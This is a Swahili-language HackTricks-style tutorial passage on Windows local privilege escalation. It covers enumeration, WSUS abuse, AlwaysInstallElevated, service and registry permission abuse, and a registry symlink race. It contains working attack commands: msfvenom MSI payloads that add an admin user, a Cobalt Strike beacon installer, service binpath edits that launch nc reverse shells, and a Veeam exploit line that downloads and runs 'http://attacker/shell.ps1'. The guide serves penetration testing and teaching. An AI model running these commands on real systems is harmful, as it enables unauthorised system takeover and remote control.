# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Chombo bora cha kutafuta Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Nadharia ya awali ya Windows

### Access Tokens

**Ikiwa haufahamu Windows Access Tokens, soma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Angalia ukurasa ufuatao kwa habari zaidi kuhusu ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Ikiwa haufahamu Integrity Levels katika Windows, unapaswa kusoma ukurasa ufuatao kabla ya kuendelea:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Udhibiti wa Usalama wa Windows

Kuna vitu tofauti katika Windows ambavyo vinaweza **kukuzuia kuorodhesha mfumo**, run executables au hata **kugundua shughuli zako**. Unapaswa **kusoma** ukurasa ufuatao na **kuorodhesha** mifumo yote ya **kinga** kabla ya kuanza uchunguzi wa privilege escalation:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

UIAccess processes launched through `RAiLaunchAdminProcess` inaweza kutumiwa vibaya kufikia High IL bila arifa wakati AppInfo secure-path checks zinapovukwa. Angalia mtiririko maalum wa UIAccess/Admin Protection bypass hapa:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

## Taarifa za Mfumo

### Uorodheshaji wa taarifa za toleo

Angalia kama toleo la Windows lina vulnerability yoyote inayojulikana (pia angalia patches zilizowekwa).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Toleo Exploits

This [site](https://msrc.microsoft.com/update-guide/vulnerability) ni ya msaada kutafuta taarifa za kina kuhusu udhaifu wa usalama wa Microsoft. Hifadhidata hii ina zaidi ya udhaifu wa usalama 4,700, ikionyesha **eneo kubwa la mashambulizi** ambalo mazingira ya Windows yanatoa.

**Kwenye mfumo**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ina watson iliyojumuishwa)_

**Kwenye kompyuta kwa taarifa za mfumo**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Mazingira

Je, kuna credential/Juicy info zilizohifadhiwa katika env variables?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Historia ya PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Faili za transkripti

Unaweza kujifunza jinsi ya kuwasha hili kwenye [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Maelezo ya utekelezaji wa pipeline za PowerShell yanarekodiwa, yakiwemo amri zilizotekelezwa, miito ya amri, na sehemu za scripts. Hata hivyo, maelezo kamili ya utekelezaji na matokeo ya pato huenda yasikamatwe.

Ili kuwezesha hili, fuata maelekezo katika sehemu ya "Transcript files" ya nyaraka, ukichagua **"Module Logging"** badala ya **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Ili kuonyesha matukio 15 ya mwisho kutoka PowersShell logs unaweza kuendesha:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Rekodi kamili ya shughuli na maudhui yote ya utekelezaji wa script inarekodiwa, ikihakikisha kwamba kila block of code imeandikwa wakati inavyoendeshwa. Mchakato huu huhifadhi audit trail kamili ya kila shughuli, muhimu kwa forensics na kuchambua tabia haribifu. Kwa kurekodi shughuli zote wakati wa utekelezaji, inatoa ufahamu wa kina kuhusu mchakato.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Matukio za logi za Script Block zinaweza kupatikana ndani ya Windows Event Viewer katika njia: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Ili kuona matukio 20 za mwisho unaweza kutumia:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Mipangilio ya Intaneti
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Diski
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Unaweza compromise the system ikiwa masasisho hayataombwa kwa kutumia http**S** bali http.

Unaanza kwa kukagua ikiwa mtandao unatumia non-SSL WSUS update kwa kuendesha yafuatayo katika cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Au yafuatayo katika PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Ikiwa utapata jibu kama mojawapo ya hizi:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Na kama `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` au `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` ni sawa na `1`.

Kisha, **inaweza kutumiwa.** Ikiwa registry ya mwisho ni sawa na 0, basi entry ya WSUS itasahaulika.

Ili kuchochea udhaifu huu unaweza kutumia zana kama: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Hizi ni scripts za MiTM zilizofungwa kama exploits zinazoweza kuingiza 'updates bandia' kwenye trafiki ya WSUS isiyo kwenye SSL.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Kwa kifupi, hili ndilo kasoro ambayo bug hili linalitumia:

> Ikiwa tuna uwezo wa kubadilisha proxy ya mtumiaji wetu wa ndani, na Windows Updates inatumia proxy iliyowekwa katika mipangilio ya Internet Explorer, basi tuna uwezo wa kuendesha [PyWSUS](https://github.com/GoSecure/pywsus) kwa ndani ili kukamata trafiki yetu wenyewe na kuendesha code kama mtumiaji aliyepewa ruhusa za juu kwenye kifaa chetu.
>
> Zaidi ya hayo, kwa kuwa huduma ya WSUS inatumia mipangilio ya mtumiaji wa sasa, itatumia pia certificate store yake. Ikiwa tutatengeneza cheti kilichojisaini kwa hostname ya WSUS na kuingiza cheti hicho kwenye certificate store ya mtumiaji wa sasa, tutaweza kukamata trafiki zote za HTTP na HTTPS za WSUS. WSUS haina mifumo kama HSTS kutekeleza uthibitisho wa aina ya trust-on-first-use kwa cheti. Ikiwa cheti kinachowasilishwa kinatazwa na mtumiaji na kina hostname sahihi, kitakubaliwa na huduma.

Unaweza kutumia udhaifu huu kwa kutumia zana [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (mara itakapokuwa imetolewa).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Wakala wengi wa shirika huweka uso wa IPC kwenye localhost na njia ya masasisho zenye vipaumbele. Ikiwa usajili unaweza kulazimishwa kwenda kwa server ya mshambuliaji na updater inaamini rogue root CA au ukaguzi dhaifu wa signer, mtumiaji wa ndani anaweza kuwasilisha MSI ya kuhujumu ambayo huduma ya SYSTEM itaisakinisha. Angalia mbinu ya jumla (inayotokana na mnyororo wa Netskope stAgentSvc – CVE-2025-0309) hapa:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` inaweka huduma ya localhost kwenye **TCP/9401** inayosindika ujumbe unaodhibitiwa na mshambuliaji, ikiruhusu amri zozote kama **NT AUTHORITY\SYSTEM**.

- **Recon**: thibitisha listener na version, kwa mfano, `netstat -ano | findstr 9401` na `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: weka PoC kama `VeeamHax.exe` pamoja na Veeam DLLs zinazohitajika katika saraka hiyo hiyo, kisha chochea payload ya SYSTEM kupitia socket ya localhost:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Huduma inatekeleza amri kama SYSTEM.

## KrbRelayUp

Kuna udhaifu wa **local privilege escalation** katika mazingira ya Windows **domain** chini ya masharti maalum. Masharti haya ni pamoja na mazingira ambapo **LDAP signing is not enforced,** watumiaji wana haki za kujipatia zinazoruhusu kusanidi **Resource-Based Constrained Delegation (RBCD),** pamoja na uwezo wa watumiaji kuunda kompyuta ndani ya domain. Ni muhimu kutambua kwamba haya **mahitaji** yanatimizwa kwa kutumia **mipangilio ya chaguo-msingi**.

Pata **exploit katika** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Kwa maelezo zaidi kuhusu mtiririko wa attack angalia [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Ikiwa** hizi funguo mbili za rejista ziko **imewezeshwa** (thamani ni **0x1**), basi watumiaji wa ngazi yoyote ya ruhusa wanaweza **kusakinisha** (execute) faili za `*.msi` kama NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Ikiwa una kikao cha meterpreter unaweza kuendesha kiotomatiki mbinu hii ukitumia module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Tumia amri ya `Write-UserAddMSI` kutoka power-up kuunda ndani ya saraka ya sasa binary ya Windows MSI ili kupandisha ruhusa. Skripti hii inatengeneza msakinishaji wa MSI uliotengenezwa awali ambaye atauliza kuongeza user/group (kwa hivyo utahitaji GIU access):
```
Write-UserAddMSI
```
Tu execute binary iliyotengenezwa ili escalate privileges.

### MSI Wrapper

Soma tutorial hii ili ujifunze jinsi ya kuunda MSI wrapper ukitumia tools hizi. Kumbuka unaweza ku-wrap faili "**.bat**" ikiwa unataka **tu** **execute** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** kwa Cobalt Strike au Metasploit a **new Windows EXE TCP payload** katika `C:\privesc\beacon.exe`
- Fungua **Visual Studio**, chagua **Create a new project** na andika "installer" kwenye sanduku la utafutaji. Chagua mradi wa **Setup Wizard** na bonyeza **Next**.
- Mpa mradi jina, kama **AlwaysPrivesc**, tumia **`C:\privesc`** kwa mahali, chagua **place solution and project in the same directory**, kisha bonyeza **Create**.
- Endelea kubonyeza **Next** hadi ufike hatua 3 ya 4 (chagua files za kujumuisha). Bonyeza **Add** na chagua Beacon payload uliyotengeneza. Kisha bonyeza **Finish**.
- Chagua mradi **AlwaysPrivesc** kwenye **Solution Explorer** na kwenye **Properties**, badilisha **TargetPlatform** kutoka **x86** kwenda **x64**.
- Kuna properties nyingine unaweza kubadilisha, kama **Author** na **Manufacturer** ambazo zinaweza kufanya app iliyosakinishwa ionekane halali zaidi.
- Bonyeza kulia kwenye mradi na chagua **View > Custom Actions**.
- Bonyeza kulia **Install** na chagua **Add Custom Action**.
- Bonyeza mara mbili **Application Folder**, chagua faili yako **beacon.exe** na bonyeza **OK**. Hii itahakikisha kwamba beacon payload is executed mara installer inapoendeshwa.
- Chini ya **Custom Action Properties**, badilisha **Run64Bit** kuwa **True**.
- Hatimaye, **build it**.
- Ikiwa onyo `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` litaonyeshwa, hakikisha umeweka platform kuwa x64.

### MSI Installation

Ili execute the **installation** ya `.msi` file yenye hatari kwa **background:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Ili kunufaika na udhaifu huu unaweza kutumia: _exploit/windows/local/always_install_elevated_

## Antivirus na Vichunguzi

### Mipangilio ya Ukaguzi

Mipangilio hii inaamua nini kina**kurekodiwa**, kwa hivyo unapaswa kulipa tahadhari
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, ni jambo la kuvutia kujua wapi logs hupelekwa
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** imeundwa kwa ajili ya **usimamizi wa local Administrator passwords**, ikihakikisha kwamba kila password ni **ya kipekee, ya nasibu, na inasasishwa mara kwa mara** kwenye kompyuta zilizounganishwa kwenye domain. Password hizi zinahifadhiwa kwa usalama ndani ya Active Directory na zinaweza kufikiwa tu na watumiaji waliopewa ruhusa za kutosha kupitia ACLs, kuwapa uwezo wa kuona local admin passwords ikiwa wameidhinishwa.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ikiwa imewezeshwa, **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**Maelezo zaidi kuhusu WDigest kwenye ukurasa huu**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Kuanzia **Windows 8.1**, Microsoft ilianzisha ulinzi ulioboreshwa kwa Local Security Authority (LSA) ili **kuzuia** jaribio la michakato isiyo ya kuaminika kusoma kumbukumbu yake au kuingiza msimbo, ikifanya mfumo kuwa salama zaidi.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** ilianzishwa katika **Windows 10**. Kusudi lake ni kulinda credentials zilizohifadhiwa kwenye kifaa dhidi ya vitisho kama pass-the-hash attacks.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** zinathibitishwa na **Local Security Authority** (LSA) na zinatumiwa na vipengele vya mfumo wa uendeshaji. Wakati data za kuingia za mtumiaji zinapothibitishwa na registered security package, domain credentials za mtumiaji kwa kawaida zinaanzishwa.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Watumiaji & Vikundi

### Orodhesha Watumiaji & Vikundi

Unapaswa kuangalia ikiwa kuna vikundi ambavyo wewe ni mwanachama vyao vinavyo na ruhusa za kuvutia
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Vikundi vilivyo na mamlaka

Ikiwa wewe **ni mwanachama wa kikundi chenye mamlaka, unaweza kuwa na uwezo wa kuinua ruhusa**. Jifunze kuhusu vikundi vilivyo na mamlaka na jinsi ya kuyatumia vibaya ili kuinua ruhusa hapa:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Jifunze zaidi** kuhusu ni nini **token** katika ukurasa huu: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Angalia ukurasa ufuatao ili **ujifunze kuhusu tokens zinazovutia** na jinsi ya kuzitumia vibaya:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Watumiaji walioingia / Vikao
```bash
qwinsta
klist sessions
```
### Folda za nyumbani
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Sera ya Nywila
```bash
net accounts
```
### Pata yaliyomo kwenye clipboard
```bash
powershell -command "Get-Clipboard"
```
## Mchakato Unaokimbia

### Ruhusa za Faili na Folda

Kwanza kabisa, kwa kuorodhesha michakato angalia kama kuna **nywila ndani ya command line ya mchakato**.\
Angalia kama unaweza **overwrite some binary running** au kama una ruhusa za kuandika kwenye folda ya binary ili kutumia [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Daima angalia uwezekano wa [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Kagua ruhusa za binaries za michakato**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Kukagua ruhusa za folda za binari za michakato (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Unaweza kuunda memory dump ya mchakato unaoendesha kwa kutumia **procdump** kutoka sysinternals. Huduma kama FTP zina **credentials in clear text in memory**; jaribu dump kumbukumbu na kusoma credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Programu za GUI zisizo salama

**Programu zinazoendeshwa kama SYSTEM zinaweza kumruhusu mtumiaji kuzindua CMD, au kuvinjari saraka.**

Mfano: "Windows Help and Support" (Windows + F1), tafuta "command prompt", bonyeza "Click to open Command Prompt"

## Huduma

Service Triggers huruhusu Windows kuanza service wakati masharti fulani yanapotokea (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, etc.). Hata bila haki za SERVICE_START mara nyingi unaweza kuanza services zenye ruhusa kwa kuwasha triggers zao. Tazama mbinu za enumeration na activation hapa:

-
{{#ref}}
service-triggers.md
{{#endref}}

Pata orodha ya services:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Ruhusa

Unaweza kutumia **sc** kupata taarifa za huduma
```bash
sc qc <service_name>
```
Inashauriwa kuwa na binary **accesschk** kutoka _Sysinternals_ ili kuangalia ngazi ya ruhusa inayohitajika kwa kila huduma.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Inashauriwa kuangalia ikiwa "Authenticated Users" wanaweza kubadilisha huduma yoyote:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Washa huduma

Ikiwa unapata kosa hili (kwa mfano na SSDPSRV):

_Kosa la mfumo 1058 limetokea._\
_Huduma haiwezi kuanzishwa, ama kwa sababu imezimwa au kwa sababu haina vifaa vilivyowezeshwa vinavyohusishwa nayo._

Unaweza kuiwezesha kwa kutumia
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Zingatia kwamba huduma upnphost inategemea SSDPSRV ili ifanye kazi (kwa XP SP1)**

**Suluhisho jingine** la tatizo hili ni kuendesha:
```
sc.exe config usosvc start= auto
```
### **Badilisha njia ya binary ya service**

Katika senario ambapo kikundi cha "Authenticated users" kinamiliki **SERVICE_ALL_ACCESS** kwenye service, inawezekana kubadilisha binary inayotekelezwa ya service. Ili kubadilisha na kutekeleza **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Anzisha tena huduma
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Madaraka yanaweza kupandishwa kupitia ruhusa mbalimbali:

- **SERVICE_CHANGE_CONFIG**: Inaruhusu usanidi upya wa service binary.
- **WRITE_DAC**: Inawezesha kusanidi upya ruhusa, ikitoa uwezo wa kubadilisha service configurations.
- **WRITE_OWNER**: Inaruhusu ownership acquisition na kusanidi upya ruhusa.
- **GENERIC_WRITE**: Inarithi uwezo wa kubadilisha service configurations.
- **GENERIC_ALL**: Pia inarithi uwezo wa kubadilisha service configurations.

Kwa utambuzi na matumizi ya udhaifu huu, _exploit/windows/local/service_permissions_ inaweza kutumika.

### Ruhusa dhaifu za service binaries

**Angalia kama unaweza kubadilisha binary ambayo inaendeshwa na service** au kama una **write permissions kwenye folda** ambapo binary iko ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Unaweza kupata kila binary inayotekelezwa na service kwa kutumia **wmic** (sio katika system32) na kuangalia ruhusa zako kwa kutumia **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Unaweza pia kutumia **sc** na **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Ruhusa za kubadilisha rejista ya huduma

Unapaswa kukagua kama unaweza kubadilisha rejista yoyote ya huduma.\
Unaweza **kuangalia** **idhini** zako juu ya **rejista ya huduma** kwa kufanya:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Ni lazima ikaguliwe ikiwa **Authenticated Users** au **NT AUTHORITY\INTERACTIVE** wana ruhusa za `FullControl`. Ikiwa ndio, binary inayotekelezwa na service inaweza kubadilishwa.

Ili kubadilisha Path ya binary inayotekelezwa:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

Baadhi ya vipengele vya Accessibility vya Windows huunda funguo za per-user **ATConfig** ambazo baadaye zinakopiwa na mchakato wa **SYSTEM** ndani ya funguo za session za HKLM. Registry **symbolic link race** inaweza kuelekeza tena uandishi huo wenye mamlaka kwa **any HKLM path**, ikitoa primitive ya HKLM ya **value write**.

Key locations (example: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` inaorodhesha vipengele vya Accessibility vilivyowekwa.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` inahifadhi usanidi unaodhibitiwa na mtumiaji.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` huundwa wakati wa kuingia/mabadiliko ya secure-desktop na ni inayoweza kuandikwa na mtumiaji.

Abuse flow (CVE-2026-24291 / ATConfig):

1. Jaza thamani ya **HKCU ATConfig** unayotaka iandikwe na SYSTEM.
2. Chochea nakala ya secure-desktop (mfano, **LockWorkstation**), ambayo inaanzisha mtiririko wa AT broker.
3. **Win the race** kwa kuweka **oplock** kwenye `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; wakati oplock itakapotekelezwa, badilisha funguo ya **HKLM Session ATConfig** kuwa **registry link** kuelekea lengo la HKLM lililolindwa.
4. SYSTEM inaandika thamani iliyochaguliwa na mshambuliaji kwenye njia ya HKLM iliyohamishwa.

Once you have arbitrary HKLM value write, pivot to LPE by overwriting service configuration values:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Chagua service ambayo mtumiaji wa kawaida anaweza kuanzisha (mfano, **`msiserver`**) na iendeshe baada ya kuandika. **Note:** utekelezaji wa public exploit hufunga workstation kama sehemu ya mbio.

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Ruhusa za Services registry AppendData/AddSubdirectory

Ikiwa una ruhusa hii juu ya rejista hii, inamaanisha **unaweza kuunda sub-rejista kutoka hii**. Katika kesi ya Windows services hii ni **inatosha kutekeleza msimbo wowote:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Njia za Service zisizo na nukuu

Ikiwa njia ya executable haijawekwa ndani ya nukuu, Windows itajaribu kuendesha kila kipande kabla ya nafasi.

